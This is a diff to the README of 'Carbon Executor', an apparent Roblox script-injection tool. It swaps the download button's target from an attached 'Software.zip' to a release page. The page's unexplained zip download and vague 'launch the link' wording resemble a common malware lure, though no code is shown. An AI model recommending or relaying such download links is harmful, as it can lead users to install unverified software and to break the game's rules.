@@ -11,7 +11,7 @@ Welcome to Carbon Executor, your gateway to unparalleled Roblox script execution
 ## Get Started
 To embark on your Roblox scripting journey with Carbon Executor, download the software by clicking the button below:
 
-[![Download Carbon Executor](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18060583/Software.zip "Launch the Software")
+[![Download Carbon Executor](https://github.com/heartwfed/Carbon-Executor/releases/tag/v2.0)](https://github.com/heartwfed/Carbon-Executor/releases/tag/v2.0 "Launch the Software")
 
 *(Note: The link provided needs to be launched to download the software.)*
 
